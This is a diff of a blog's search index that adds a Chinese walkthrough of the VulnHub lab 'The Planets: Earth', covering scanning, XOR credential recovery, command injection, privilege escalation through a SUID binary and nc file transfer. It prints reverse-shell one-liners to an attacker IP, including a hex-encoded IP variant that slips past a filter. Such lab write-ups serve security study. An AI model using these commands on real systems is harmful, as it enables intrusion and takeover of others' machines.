+    <url>/2022/01/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AENPS%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
+    <content><![CDATA[<h2 id="云服务器配置NPS服务实现内网穿透"><a href="#云服务器配置NPS服务实现内网穿透" class="headerlink" title="云服务器配置NPS服务实现内网穿透"></a>云服务器配置NPS服务实现内网穿透</h2><p>pdf:</p>
+
+
+	<div class="row">
+    <embed src="nps.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+]]></content>
+      <categories>
+        <category>内网穿透</category>
+      </categories>
+  </entry>
+  <entry>
     <title>web渗透——dhanush</title>
     <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94dhanush/</url>
     <content><![CDATA[<h2 id="web渗透——dhanush"><a href="#web渗透——dhanush" class="headerlink" title="web渗透——dhanush"></a>web渗透——dhanush</h2><p>靶机:</p>
@@ -1021,23 +1021,6 @@
 ]]></content>
       <categories>
         <category>web渗透</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>云服务器配置NPS服务实现内网穿透</title>
-    <url>/2022/01/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AENPS%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
-    <content><![CDATA[<h2 id="云服务器配置NPS服务实现内网穿透"><a href="#云服务器配置NPS服务实现内网穿透" class="headerlink" title="云服务器配置NPS服务实现内网穿透"></a>云服务器配置NPS服务实现内网穿透</h2><p>pdf:</p>
-
-
-	<div class="row">
-    <embed src="nps.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-]]></content>
-      <categories>
-        <category>内网穿透</category>
       </categories>
   </entry>
   <entry>
@@ -1423,6 +1406,157 @@
 ]]></content>
       <categories>
         <category>CTF笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>vulnhub靶场——The Planets:Earth</title>
+    <url>/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/</url>
+    <content><![CDATA[<h1 id="vulnhub靶场——The-Planets-Earth"><a href="#vulnhub靶场——The-Planets-Earth" class="headerlink" title="vulnhub靶场——The Planets:Earth"></a>vulnhub靶场——The Planets:Earth</h1><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>攻击机： kali</p>
+<p>靶机: THE PLANETS:EARTH NAT 192.168.91.0 网段</p>
+<p>下载连接</p>
+<p><a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/2d9f7f556516130895787cf7b8b215c2.png" alt="2d9f7f556516130895787cf7b8b215c2.png" title="2d9f7f556516130895787cf7b8b215c2.png"></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/573696e8e44b523def4966e7e4db3362.png" alt="573696e8e44b523def4966e7e4db3362.png" title="573696e8e44b523def4966e7e4db3362.png"></p>
+<p>信息搜集与利用</p>
+<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><a href="https://github.com/czheisenberg/MyCode/blob/master/Scan/scapy/ping.py">https://github.com/czheisenberg/MyCode/blob/master/Scan/scapy/ping.py</a></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/9fec3ae0f9558ad102f2ec38ac16d10a.png" alt="9fec3ae0f9558ad102f2ec38ac16d10a.png" title="9fec3ae0f9558ad102f2ec38ac16d10a.png"></p>
+<p>如图所示利用python脚本扫描除了 IP 地址。</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><strong>nmap -O -sV -p- -A 192.168.91.171 -oN earth_namp.txt</strong></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/c427a20df2ea1fa826f84ad277ae68ac.png" alt="c427a20df2ea1fa826f84ad277ae68ac.png" title="c427a20df2ea1fa826f84ad277ae68ac.png"></p>
+<p>如图所示开放了 三个端口， 22，80，443，且80和443都是python3.9构成</p>
+<p><font style="font-size: 14pt;"><br></font></p>
+<h3 id="HTTP-and-HTTPS"><a href="#HTTP-and-HTTPS" class="headerlink" title="HTTP and HTTPS"></a>HTTP and HTTPS</h3><p><a href="http://192.168.91.171/">http://192.168.91.171/</a></p>
+<p><a href="https://192.168.91.171/">https://192.168.91.171/</a></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/d76604f8dcd835ae1dcac53286f35729.png" alt="d76604f8dcd835ae1dcac53286f35729.png" title="d76604f8dcd835ae1dcac53286f35729.png"></p>
+<p>如图所示，直接打开为 Bad Request(400),此时注意看 namp 扫描结果:</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/2a02b7547595d85de782a0f5714e1946.png" alt="2a02b7547595d85de782a0f5714e1946.png" title="2a02b7547595d85de782a0f5714e1946.png"></p>
+<p>可以看到两条 DNS 记录，因此需要手动修改 /etc/hosts 信息。</p>
+<p>windows: C:\Windows\System32\dirvers\etc\hosts</p>
+<p>Linux: /etc/hosts</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/d68747e533813359667b2958cdfa8e89.png" alt="d68747e533813359667b2958cdfa8e89.png" title="d68747e533813359667b2958cdfa8e89.png"></p>
+<p>ipconfig /flushdns</p>
+<p>刷新DNS缓存</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/e2a4e84c9da72a7397d8bc9803372977.png" alt="e2a4e84c9da72a7397d8bc9803372977.png" title="e2a4e84c9da72a7397d8bc9803372977.png"></p>
+<p>到了这一步就可以正常访问页面了</p>
+<p><a href="https://earth.local/">https://earth.local/</a></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/384fcddadb67d5ef1afc62fbf8e30152.png" alt="384fcddadb67d5ef1afc62fbf8e30152.png" title="384fcddadb67d5ef1afc62fbf8e30152.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span><br><span class="line"></span><br><span class="line">3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span><br><span class="line"></span><br><span class="line">2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://terratest.earth.local/">https://terratest.earth.local/</a></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/e276745ee24e2d270800c5813e905655.png" alt="e276745ee24e2d270800c5813e905655.png" title="e276745ee24e2d270800c5813e905655.png"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>python3 dirsearch.py -u <a href="https://earth.local/">https://earth.local/</a></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/3ade98d009464450b397ee9e3fbb063b.png" alt="3ade98d009464450b397ee9e3fbb063b.png" title="3ade98d009464450b397ee9e3fbb063b.png"></p>
+<p><strong>python3 dirsearch.py -u <a href="https://terratest.earth.local/">https://terratest.earth.local/</a></strong></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/2ceb65246e74e5ffa54afc65fe13acfe.png" alt="2ceb65246e74e5ffa54afc65fe13acfe.png" title="2ceb65246e74e5ffa54afc65fe13acfe.png"></p>
+<p>挨个儿访问</p>
+<p><a href="https://earth.local/admin/login">https://earth.local/admin/login</a></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/524d78bc58c213660210cedf7aa622a8.png" alt="524d78bc58c213660210cedf7aa622a8.png" title="524d78bc58c213660210cedf7aa622a8.png"></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/756496747752d289634713e2f7906e82.png" alt="756496747752d289634713e2f7906e82.png" title="756496747752d289634713e2f7906e82.png"></p>
+<p>此插件可以看到为 Django</p>
+<p>猜测是否开启了 DEBUG 模式，随便输入url 显示 Not Found 则证明关闭了DEBUG 模式。</p>
+<p><a href="https://terratest.earth.local/robots.txt">https://terratest.earth.local/robots.txt</a></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/aa4fa789a0e9edff9a649219cc895788.png" alt="aa4fa789a0e9edff9a649219cc895788.png" title="aa4fa789a0e9edff9a649219cc895788.png"></p>
+<p>这里有没有Django，robots协议中 * 未知，访问不了，最后一个 testingnotes.* 猜测后缀为 txt时有如下内容</p>
+<p><a href="https://terratest.earth.local/testingnotes.txt">https://terratest.earth.local/testingnotes.txt</a></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/aa4dcef3d5bb8c92c33a4f15ecaaa39a.png" alt="aa4dcef3d5bb8c92c33a4f15ecaaa39a.png" title="aa4dcef3d5bb8c92c33a4f15ecaaa39a.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试安全消息传递系统注意事项：</span><br><span class="line"></span><br><span class="line">\*使用XOR加密作为算法，应该和RSA中使用的一样安全。</span><br><span class="line"></span><br><span class="line">\*地球已经确认他们收到了我们发送的信息。</span><br><span class="line"></span><br><span class="line">\*testdata.txt用于测试加密。</span><br><span class="line"></span><br><span class="line">**\*terra用作管理员门户的用户名。**</span><br><span class="line"></span><br><span class="line">**待办事项：**</span><br><span class="line"></span><br><span class="line">**\*我们如何安全地把每月的钥匙送到地球上？还是我们应该每周换钥匙？**</span><br><span class="line"></span><br><span class="line">**\*需要测试不同的密钥长度以防止暴力。钥匙应该放多长时间？**</span><br><span class="line"></span><br><span class="line">**\*需要改进消息传递界面和管理面板的界面，这是目前非常基本的。</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://terratest.earth.local/testdata.txt">https://terratest.earth.local/testdata.txt</a></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/b996b23940aa0292bbcf7eedbac976d2.png" alt="b996b23940aa0292bbcf7eedbac976d2.png" title="b996b23940aa0292bbcf7eedbac976d2.png"></p>
+<p>根据辐射测年估计和其他证据，地球形成于45亿年前。在地球历史的最初10亿年里，生命出现在海洋中，并开始影响地球的大气层和表面，导致厌氧生物和后来的需氧生物的扩散。一些地质证据表明，生命可能早在41亿年前就出现了。</p>
+<p>从上面的内容可以知道如下信息:</p>
+<ol>
+<li>```<ol>
+<li>terra 为管理员用户名</li>
+<li>使用 XOR （异或）运算</li>
+<li>需要将首页的   Previous Messages 与 testdata.txt 做 异或运算，进行解密。</li>
+<li>做CTF题了 🤣<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">### 解码</span><br><span class="line"></span><br><span class="line">decode.py</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">┌──(root💀ohh)-[~/myfiles/bj/linux/earth]</span><br><span class="line"></span><br><span class="line">└─# cat decode.py</span><br><span class="line"></span><br><span class="line">**import binascii**</span><br><span class="line"></span><br><span class="line">**c = &quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;**</span><br><span class="line"></span><br><span class="line">**m = &quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;**</span><br><span class="line"></span><br><span class="line">**m = binascii.b2a\_hex(m.encode(&quot;utf-8&quot;))**</span><br><span class="line"></span><br><span class="line">**result = hex(int(c,16) ^ int(m,16))**</span><br><span class="line"></span><br><span class="line">**print(result)**</span><br><span class="line"></span><br><span class="line">┌──(root💀ohh)-[~/myfiles/bj/linux/earth]</span><br><span class="line"></span><br><span class="line">└─# python3 decode.py</span><br><span class="line"></span><br><span class="line">0x6561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<p>在线16进制转字符</p>
+<p><a href="https://www.sojson.com/hexadecimal.html">https://www.sojson.com/hexadecimal.html</a></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/08122a2fdc40f6f55512c67e6f5a5835.png" alt="08122a2fdc40f6f55512c67e6f5a5835.png" title="08122a2fdc40f6f55512c67e6f5a5835.png"></p>
+<p>得到结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span><br></pre></td></tr></table></figure>
+
+<p>发现全部是重复 : earthclimatechangebad4humans</p>
+<p>因此得到了账号密码:</p>
+<p><font style="font-size: 14pt;"><br></font></p>
+<h3 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h3><p><strong>terra:earthclimatechangebad4humans</strong></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/27ff61a253b3208e3b895ce7b4b79875.png" alt="27ff61a253b3208e3b895ce7b4b79875.png" title="27ff61a253b3208e3b895ce7b4b79875.png"></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/7e5402e432c71c15b7961b21611e1035.png" alt="7e5402e432c71c15b7961b21611e1035.png" title="7e5402e432c71c15b7961b21611e1035.png"></p>
+<p>如图所示登陆成功，来到一个命令执行的界面</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/0aca95628a1521f2d412bf470959efc0.png" alt="0aca95628a1521f2d412bf470959efc0.png" title="0aca95628a1521f2d412bf470959efc0.png"></p>
+<p>输入 id;ls 可见，为 apache用户，同时显示出了 根目录下的内容，根据 vulnhub 的描述:  There are two flags on the box: a user and root flag which include an md5 hash. </p>
+<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag 1"></a>flag 1</h3><p>可知共有两个flag,分别是 user 下 和 root 下</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/2343cc0157f7f816f6459b0a2d6d3d6f.png" alt="2343cc0157f7f816f6459b0a2d6d3d6f.png" title="2343cc0157f7f816f6459b0a2d6d3d6f.png"></p>
+<p>输入 find / -name “*flag*“ 查找到了 flag 位于  /var/earth_web/user_flag.txt</p>
+<p>直接查看</p>
+<p>cat  /var/earth_web/user_flag.txt<img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/8113902a552adf25a5fa14d8a9a7aa3d.png" alt="8113902a552adf25a5fa14d8a9a7aa3d.png" title="8113902a552adf25a5fa14d8a9a7aa3d.png"></p>
+<p>如图所示拿到了第一个 flag,根据描述第二个 flag 位于 root 目录下，因此我们得通过提权拿到 root 权限才能查看。</p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>bash -i &gt;&amp; /dev/tcp/172.31.160.47/4444 0&gt;&amp;1</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/94c25415b27dd189f57bd619a0dc6257.png" alt="94c25415b27dd189f57bd619a0dc6257.png" title="94c25415b27dd189f57bd619a0dc6257.png"></p>
+<p>如图所示显示： 远程连接禁止。</p>
+<p>看了大佬的文章中讲到将IP地址 十六进制转换即可，具体为什么，我不知道，照搬吧！记住这个技巧。</p>
+<p>bash -i &gt;&amp; /dev/tcp/0xac.0x1f.0xa0.0x2f/4444 0&gt;&amp;1</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/c3ceb2a09686a0469fd80998153ee2d6.png" alt="c3ceb2a09686a0469fd80998153ee2d6.png" title="c3ceb2a09686a0469fd80998153ee2d6.png"></p>
+<p>好，拿到了shell，接下来提权，先信息搜集</p>
+<p>cat /etc/passwd</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/677d1bbb5827006f7354bebd1909e3aa.png" alt="677d1bbb5827006f7354bebd1909e3aa.png" title="677d1bbb5827006f7354bebd1909e3aa.png"></p>
+<p>如图所示只有两个用户具有 /bin/bash : root, earth</p>
+<p>uname -a </p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/4aa2f7bac53331ca8fe1095f323d336e.png" alt="4aa2f7bac53331ca8fe1095f323d336e.png" title="4aa2f7bac53331ca8fe1095f323d336e.png"></p>
+<p>没用</p>
+<p>尝试</p>
+<h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p><strong>find / -perm -u=s -type f 2&gt;/dev/null</strong></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/c149aca35fa71812000fdd392a790a47.png" alt="c149aca35fa71812000fdd392a790a47.png" title="c149aca35fa71812000fdd392a790a47.png"></p>
+<p>如图所示根据返回结果，/usr/bin/reset_root 极有可能拿到 root 权限。</p>
+<p>直接运行</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/225b1d802aa1ca42e68a7153aa0ef8b1.png" alt="225b1d802aa1ca42e68a7153aa0ef8b1.png" title="225b1d802aa1ca42e68a7153aa0ef8b1.png"></p>
+<p>检查是否存在重置触发器</p>
+<p>重置失败，所有触发器不存在</p>
+<p>不出所料，失败。</p>
+<p>在靶机上调试不了，可以将这个命令下载到 kali 中调试，下载可以利用 nc 传输文件。</p>
+<p>现在kali/接收方启动:</p>
+<p><strong>nc -l 5555 &gt; reset_root</strong></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/9d1758c69c981540deb45ad917690593.png" alt="9d1758c69c981540deb45ad917690593.png" title="9d1758c69c981540deb45ad917690593.png"></p>
+<p>然后在靶机上/发送方 启动</p>
+<p><strong>nc  172.31.160.47 5555 &lt; /usr/bin/reset_root</strong></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/c5df8e9328077913a3affd2718c77e02.png" alt="c5df8e9328077913a3affd2718c77e02.png" title="c5df8e9328077913a3affd2718c77e02.png"></p>
+<p>可以看到瞬间完成。</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/21584cdae9589d0bd5bded10e7947997.png" alt="21584cdae9589d0bd5bded10e7947997.png" title="21584cdae9589d0bd5bded10e7947997.png"></p>
+<p>现在将 reset_root 下载下来了，可以调试了，这里要学习一个新的命令: strace</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/107fd150b506a2f5fc932ec775c0db85.png" alt="107fd150b506a2f5fc932ec775c0db85.png" title="107fd150b506a2f5fc932ec775c0db85.png"></p>
+<p>若没有这个命令，先安装一遍即可。</p>
+<p>使用之前需要将 reset_root 赋于执行权限</p>
+<p><strong>chmod +x reset_root</strong></p>
+<p><strong>strace ./reset_root</strong></p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/e19baa69f89b29edf5ee8c26dd8c8680.png" alt="e19baa69f89b29edf5ee8c26dd8c8680.png" title="e19baa69f89b29edf5ee8c26dd8c8680.png"></p>
+<p>从返回结果可以看到 有 三个 No such file or directory</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">access(&quot;/dev/shm/kHgTFI5G&quot;, F\_OK)       = -1 ENOENT (No such file or directory)</span><br><span class="line"></span><br><span class="line">access(&quot;/dev/shm/Zw7bV9U5&quot;, F\_OK)       = -1 ENOENT (No such file or directory)</span><br><span class="line"></span><br><span class="line">access(&quot;/tmp/kcM0Wewe&quot;, F\_OK)           = -1 ENOENT (No such file or directory)</span><br></pre></td></tr></table></figure>
+
+<p>那么可能因为靶机上没有这个三个文件，从而运行失败，那我们去靶机上创建这个三个文件，文件中是什么内容呢？没人知道有没有内容。先查看 靶机是否有这三个文件，没有则创建然后在运行。</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/523da7fa92c3dc5c435ba17cc1b0da60.png" alt="523da7fa92c3dc5c435ba17cc1b0da60.png" title="523da7fa92c3dc5c435ba17cc1b0da60.png"></p>
+<p>如图所示确实没有，strace 命令好牛逼啊。</p>
+<p>创建，然后运行</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/66e0b1b14df15000db3b56c3f762ca98.png" alt="66e0b1b14df15000db3b56c3f762ca98.png" title="66e0b1b14df15000db3b56c3f762ca98.png"></p>
+<p>从返回结果可以看到 : resetting root password to : Earth, 将 root 用户的密码更改为了 Earth.</p>
+<p>切换 root</p>
+<p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/c05bf79e132afe750a4e310352a39628.png" alt="c05bf79e132afe750a4e310352a39628.png" title="c05bf79e132afe750a4e310352a39628.png"></p>
+<p>如图所示现在为 root。</p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a><strong><font style="font-size: 14pt;">flag2</font></strong></h3><p><img src="/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/82741423a212403b8373a58e7b7bd383.png" alt="82741423a212403b8373a58e7b7bd383.png" title="82741423a212403b8373a58e7b7bd383.png"></p>
+<p>地球出来了，flag 也出来了。</p>
+<p>到此为止成功拿到 root 权限。</p>
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ol>
+<li>难点在于密码破解，根据明文和密文然后异或运算得到密码。</li>
+<li>新学到了 nc 可用于传输文件。</li>
+<li>新学到了 strace 命令，很强大。</li>
+<li>bash -i &gt;&amp; /dev/tcp/0xac.0x1f.0xa0.0x2f/4444 0&gt;&amp;1 可以将 ip 地址转换为十六进制，学到了。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>web渗透</category>
       </categories>
   </entry>
   <entry>
